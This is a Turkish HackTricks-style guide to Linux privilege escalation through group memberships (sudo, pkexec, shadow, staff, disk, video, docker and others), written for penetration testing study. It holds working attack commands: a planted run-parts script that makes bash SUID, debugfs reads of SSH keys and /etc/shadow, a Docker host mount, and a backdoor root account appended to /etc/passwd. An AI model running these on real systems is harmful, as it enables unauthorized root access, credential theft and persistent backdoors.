# İlginç Gruplar - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Yönetici Grupları

### **PE - Method 1**

**Bazen**, bir sistemin **/etc/sudoers** ilkesi (veya bu dosyanın dahil ettiği bir dosya) şu tür girdiler içerir:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Bu, her iki girdiden biriyle eşleşen herhangi bir kullanıcının `sudo` aracılığıyla herhangi bir hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabidir).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için şu komutu çalıştırmanız yeterlidir**:

```
sudo su
```

`sudo -l`, yalnızca kullanıcı adıyla kısıtlanmış bir `adduser` çağrısına izin veriyorsa, henüz mevcut olmayan aynı adlı bir birincil grup oluşturup oluşturmadığını kontrol edin. Bu grupta oluşturulan yeni bir hesap, etkin sudoers ilkesinde `%group` için zaten ayrıcalıklar tanımlanmışsa bunları elde edebilir; bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce hem grubun oluşturulduğunu hem de grup kuralını doğrulayın. Hesap oluşturmak sistemi değiştirir; önce ilkeyi inceleyin.

### PE - Method 2

Tüm SUID binary'lerini bulun ve **Pkexec** binary'sinin olup olmadığını kontrol edin:

```bash
find / -perm -4000 2>/dev/null
```

**pkexec bir SUID binary ise**, başka bir kullanıcı olarak yalnızca polkit istenen eyleme izin verdiğinde program çalıştırabilir; SUID biti tek başına root erişimini garanti etmez. **sudo** veya **admin** grubuna üyeliğin yeterli olduğunu varsaymak yerine, yüklü politikayı ve hedef oturumun yetkilendirmesini kontrol edin.<sup>[[4]](#references)[[5]](#references)</sup>

Ayrı [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) yolu için önce `pkexec` dosyasının çalıştırılabilir ve **root sahibi bir SUID** dosyası olduğunu doğrulayın. Bu bite sahip olmayan yüklü bir binary, güvenlik duyurusunda açıklanan yerel SUID yetki yükseltme açığı değildir. Upstream sürüm dizesi yalnızca bir ipucudur: dağıtımlar düzeltmeyi [eski paket sürümlerine backport edebilir](https://ubuntu.com/security/CVE-2021-4034); bu nedenle açığın bulunduğunu söylemeden önce yüklü vendor paketini ve azaltıcı önlemleri kontrol edin.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) farklı bir polkit yoludur: `pkexec` SUID açığı değil, bir D-Bus yetkilendirme yarış durumudur. Yüklü vendor polkit paketini ve erişilebilir bir ayrıcalıklı D-Bus eyleminin işe yarar bir değişiklik yapıp yapamayacağını inceleyin; hesap oluşturma yolu ayrıca AccountsService gibi uygun bir hizmet gerektirir ve yeni grubun sudo erişimi, yürürlükteki sudo politikasına bağlıdır. Bildirilen bir polkit sürümü veya yüklü bir hizmet tek başına yalnızca olası bir adaydır; özellikle vendor'ların [düzeltmeleri backport ettiği](https://access.redhat.com/security/cve/cve-2021-3560) durumlarda. Pasif enumeration, yarış durumunu tetiklememelidir.

Hâlâ eski Local Authority backend'ini kullanan dağıtımlarda grup kurallarını şu komutla inceleyin:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

İlgili grup adları ve varsayılanlar dağıtıma göre değişir; bir grup burada yalnızca yerel ilke tarafından adlandırılmışsa işe yarar.<sup>[[5]](#references)</sup>

**root olmak için şunu çalıştırabilirsiniz**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

**pkexec** komutunu çalıştırmayı denediğinizde bu **hatayı** alırsanız:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Kayıtlı bir kimlik doğrulama aracısı olmayan bir SSH oturumunda, ilke eyleme başka türlü izin verse bile `pkexec` şu hatayı verebilir; polkit, masaüstü olmayan oturumlar için metin tabanlı bir kimlik doğrulama aracısı olarak `pkttyagent`'ı belgeler. Kesin davranış sürüme ve dağıtıma bağlıdır; bu nedenle yerel ilkeyi ve aracı kurulumunu doğrulayın. Etkilenen NixOS sürümleri için bildirilen bir geçici çözüm **2 farklı SSH oturumu** kullanır.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Bir hesabın `su`'ya erişimini engelleyen bir ACL, her yönetici yetkisi gerektiren eylem yolunu değil, söz konusu çalıştırılabilir dosyayı kısıtlar. Bir yönetici kimlik bilgisi ayrıca ifşa edilmişse, `systemd-run` aracılığıyla geçici bir sistem hizmeti başlatma gibi ayrı bir eyleme etkin polkit ilkesinin izin verip vermediğini, kimlik doğrulama aracısının hangi kimliği kabul ettiğini ve ortaya çıkan hizmetin hangi kimlikle çalışacağını inceleyin. [Polkit, oturum sahibinin kimliğiyle yönetici kimliğiyle yapılan kimlik doğrulamayı birbirinden ayırır](https://polkit.pages.freedesktop.org/polkit/polkit.8.html); [systemd-run ise sistem yöneticisinden geçici bir hizmet talep edebilir](https://systemd.io/CONTROL_GROUP_INTERFACE/). Bir geçmiş girdisi, kurulu bir komut veya okunabilir bir ilke dosyası tek başına yetkilendirme ya da kimlik bilgilerinin geçerliliğini kanıtlamaz; pasif inceleme kimlik bilgilerini göndermemeli veya bir birim başlatmamalıdır.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Grubu

Bazen bir sudoers politikası şu girdiyi de içerebilir:

```
%wheel	ALL=(ALL:ALL) ALL
```

Bu, girdinin eşleştiği herhangi bir kullanıcının `sudo` aracılığıyla hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabidir).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için şunu çalıştırabilirsiniz**:

```
sudo su
```

## Shadow Group

İzinlerin bunu mümkün kıldığı sistemlerde, **shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**; hedefteki gerçek dosya modunu ve ACL'leri doğrulayın:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Dosyayı okuyun ve bazı hash'leri **crack etmeye** çalışın.

Hash'leri incelerken kilit durumuyla ilgili önemli bir ayrıntı:
- `!` veya `*` içeren girdiler genellikle parola ile etkileşimli oturum açmaya izin vermez.
- `!hash`, parolanın kilitlendiği anlamına gelir; kalan karakterler, kilitlenmeden önce parola alanında bulunan değeri temsil eder.
- `*` içeren bir alan geçerli bir `crypt(3)` hash'i değildir ve UNIX parolasıyla oturum açmayı engeller; bu alandan daha önce bir parola belirlenip belirlenmediği sonucunu çıkarmayın.
Doğrudan oturum açma engellense bile bu bilgi, hesapları sınıflandırmak için yararlıdır.<sup>[[6]](#references)</sup>

## staff Grubu

**staff**: Kullanıcıların root ayrıcalıklarına ihtiyaç duymadan sistemde (`/usr/local`) yerel değişiklikler yapmasına olanak tanır (`/usr/local/bin` içindeki çalıştırılabilir dosyaların her kullanıcının PATH değişkeninde bulunduğunu ve aynı ada sahip `/bin` ve `/usr/bin` dosyalarını "geçersiz kılabileceğini" unutmayın). Güvenlik izleme ile daha çok ilişkili olan "adm" grubuyla karşılaştırın.<sup>[[2]](#references)[[7]](#references)</sup>

`/usr/local/bin` dizininin `PATH` içinde `/usr/bin` dizininden önce geldiği Debian yapılandırmalarında (aşağıdaki örneklerde olduğu gibi), tam yolu belirtilmeyen bir komut önce `/usr/local/bin` kopyasına karşılık gelir; hedef sistemde geçerli `PATH` değerini doğrulayın.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ayrıcalıklı bir süreç, tam yolu belirtilmemiş bir komutu yazılabilir bir `/usr/local/bin` dizininde çözümlerse, bu komutu değiştirmek komutun sürecin ayrıcalıklarıyla çalıştırılmasına yol açabilir; test etmeden önce gerçek yolu ve tetikleyiciyi doğrulayın.

Ubuntu sistemlerinde `pam_motd`, oturum açıldığında root olarak `run-parts --lsbsysinit` aracılığıyla çalıştırılabilir betikleri yürütür; cron işleri de `run-parts` kullanabilir, ancak bu dağıtıma ve yapılandırmaya özeldir.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Yeni bir SSH girişinde `pspy`, bu yolun hedefte gerçekten çağrılıp çağrılmadığını doğrulamaya yardımcı olabilir; root olmadan process command line'larını gözlemleyebilir.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Grubu

**disk** grubuna üyelik, blok aygıtlarına ham erişim sağlayabilir ve çoğu zaman **root erişimine yakındır**; Debian bunu büyük ölçüde root erişimine eşdeğer olarak tanımlar, ancak hedefteki gerçek aygıt izinlerini ve depolama düzenini doğrulayın.<sup>[[7]](#references)</sup>

Yaygın aygıt yolları arasında `/dev/sd*` bulunur, ancak NVMe ve diğer depolama düzenleri farklı adlar kullanır.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs`, ext2/ext3/ext4 dosya sistemleri üzerinde çalışır; yukarıdaki `/root` ve `/etc/shadow` gibi yollar, açılan dosya sistemindeki dosyalardır. `dump` komutunun ikinci argümanı ise yerel dosya sistemindeki bir çıktı yoludur.<sup>[[8]](#references)</sup> Örneğin bu komut, açılan dosya sistemindeki `/tmp/asd1.txt` dosyasını yerel dosya sistemindeki `/tmp/asd2.txt` konumuna çıkarır:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` seçeneği dosya sistemini okuma-yazma modunda açar ve `write` komutu yerel bir dosyayı açılan dosya sistemine kopyalar. Doğrudan değişiklikler dosya sistemini bozabileceğinden, bunu bağlı ve kullanımda olan bir dosya sisteminde kullanmaktan kaçının; mümkünse çevrimdışı bir imaj üzerinde çalışın.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Grubu

`w` komutunu kullanarak **sistemde kimlerin oturum açtığını** bulabilir ve aşağıdaki gibi bir çıktı görüntüleyebilirsiniz.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** girdisi ilk Linux sanal konsolunu belirtir; özellikle container'larda veya diğer ortamlarda tek başına kullanıcının makinenin başında fiziksel olarak bulunduğunu kanıtlamaz.<sup>[[21]](#references)</sup>

Okunabilir bir framebuffer aygıtı sunan sistemlerde **video** grubuna üyelik bu aygıta erişim sağlayabilir. Linux framebuffer arayüzü, `/dev/fb0` aygıtını ekran görüntüsü almak için kopyalanabilen okunabilir bir bellek aygıtı olarak tanımlar; `/sys/class/graphics/fb0/virtual_size` yolu yalnızca ilgili fbdev sysfs özniteliğinin bulunduğu sistemlerde mevcuttur; bu nedenle önce hedefi kontrol edin.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Yüklü **GIMP** sürümünde ham veri içe aktarıcısı varsa **`screen.raw`** dosyasını bu içe aktarıcıyla açın; destek ve kontroller sürüme ve plug-in'e göre değişir.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Ham görüntüyü açmak için GIMP kullanabilir, screen.raw dosyasını seçebilir ve dosya türü olarak Raw image data'yı seçebilirsiniz](<../../../images/image (463).png>)

Görüntü Width ve Height değerlerini framebuffer geometrisiyle eşleşecek şekilde ayarlayın; çıktı okunaklı olana kadar kullanılabilir piksel formatlarını/Image Types seçeneklerini deneyin.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Ardından Width ve Height değerlerini ekranda kullanılan değerlere göre değiştirin ve farklı Image Types seçeneklerini deneyin (ekranı en iyi göstereni seçin)](<../../../images/image (317).png>)

## Root Grubu

**root** grubuna üye olmak root'un UID'sini sağlamaz; ancak ayrıcalıklı servisler veya kütüphaneler tarafından kullanılan, `root` sahipliğindeki grup tarafından yazılabilir dosyalar yine de ilgi çekici olabilir. Bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce dosyanın gerçek izinlerini ve nasıl kullanıldığını doğrulayın.

**root grubu üyelerinin değiştirebildiği dosyaları kontrol edin**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

`docker` grubuna üyelik, standart rootful kurulumlarda Docker daemon'a root düzeyinde erişim sağlar. Bind mount'lar varsayılan olarak read-write olduğundan, daemon'ı kontrol edebilen bir kullanıcı host'un `/` dizinini bir container'a mount edip host dosyalarını değiştirebilir; bu da host üzerinde root erişimi sağlar.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Grup üyeliği `/etc/group`, `/etc/gshadow` ve mevcut process token arasında eşleşmeyebilir. Kullanıcı `id -nG` çıktısında yoksa ancak `newgrp docker` başarılı oluyorsa, yeni shell'de `id` ile gösterilen grubu kontrol edin ve Docker socket'inin gerçekten yazılabilir olup olmadığını ve rootful bir daemon'a hizmet verip vermediğini test edin. Grup adı tek başına host kontrolünün kanıtı değildir. Otomatik `newgrp` denemelerini, parola isteminin enumeration işlemini durdurmasını önleyecek şekilde sınırlandırın.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Son olarak, önceki önerilerden hiçbirini beğenmezseniz veya herhangi bir nedenle işe yaramazlarsa (docker api firewall?), her zaman burada açıklandığı gibi **privileged container çalıştırıp içinden escape etmeyi** deneyebilirsiniz:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Docker socket üzerinde yazma izniniz varsa [**docker socket'i kötüye kullanarak yetkileri yükseltme hakkındaki bu yazıyı**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)** okuyun.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Grubu

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Grubu

Genellikle **`adm`** grubunun **üyeleri**, _/var/log/_ içindeki günlük dosyalarını **okuma** iznine sahiptir.\
Bu nedenle, bu gruptaki bir kullanıcıyı ele geçirdiyseniz **günlüklere göz atmayı** kesinlikle denemelisiniz.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail grupları

Bu grupların anlamları hizmete ve dağıtıma özeldir. Debian, devredilmiş yedekleme/geri yükleme için `backup` grubunu, yazıcı daemon'ları için `lp` grubunu ve `/var/mail` için `mail` grubunu belgeliyor; bu nedenle üyeliği bir yetki yükseltme yolu olarak değerlendirmeden önce yerel izinleri kontrol edin.<sup>[[7]](#references)</sup>

Bunlar genellikle doğrudan root erişiminden ziyade **kimlik bilgisi keşfi** için fırsat oluşturur:
- **backup**: Yapılandırma dosyaları, anahtarlar, DB dökümleri veya token'lar içeren arşivleri açığa çıkarabilir.
- **operator**: Platforma özgü operasyonel erişim, hassas çalışma zamanı verilerini sızdırabilir.
- **lp**: Yazdırma kuyrukları/spool'ları belge içeriklerini barındırabilir.
- **mail**: Posta spool'ları parola sıfırlama bağlantılarını, OTP'leri ve dahili kimlik bilgilerini açığa çıkarabilir.

Bu gruplara üyeliği yüksek değerli bir veri ifşası bulgusu olarak değerlendirin ve parola/token tekrar kullanımını araştırın.

## Auth Grubu

OpenBSD'de S/Key yapılandırıldığında `/etc/skey` dosyasının sahibi `root:auth` olur ve kayıtlarına erişmek için `auth` grubuna üyelik gerekir; YubiKey kayıtları `/var/db/yubikey` içinde saklanır.<sup>[[16]](#references)[[17]](#references)</sup> S/Key veya YubiKey etkin olan ve güvenlik açığı barındıran bir OpenBSD 6.6 yapılandırması, `auth` ayrıcalıklarına sahip yerel kullanıcıların root olmasına olanak tanıyordu; Qualys ön koşulları ve exploit zincirini belgeliyor, bağlantıdaki PoC ise bunu uyguluyor.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI oturumu olmadan pkexec/pkttyagent kimlik doğrulaması (NixOS sorunu #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Sistem Grupları - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Başvuru Kılavuzu](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Başvuru Kılavuzu](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian'ı Güvenli Hale Getirme Kılavuzu](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux kılavuz sayfası](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Kare Arabellek Aygıtı — Linux Çekirdeği belgeleri](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — ayrıcalıksız Linux süreçlerini izleme](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine güvenliği](https://docs.docker.com/engine/security/)
- [14] [Docker'ı root olmayan kullanıcı olarak yönetme](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Container'ları çalıştırma — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD kılavuz sayfaları](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD kılavuz sayfaları](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD'deki kimlik doğrulama güvenlik açıkları — Qualys Güvenlik Duyurusu](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — yerel exploit PoC'si](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux ayrılmış aygıtları (4.x+ sürümü)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Görüntü içe ve dışa aktarma — GIMP belgeleri](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
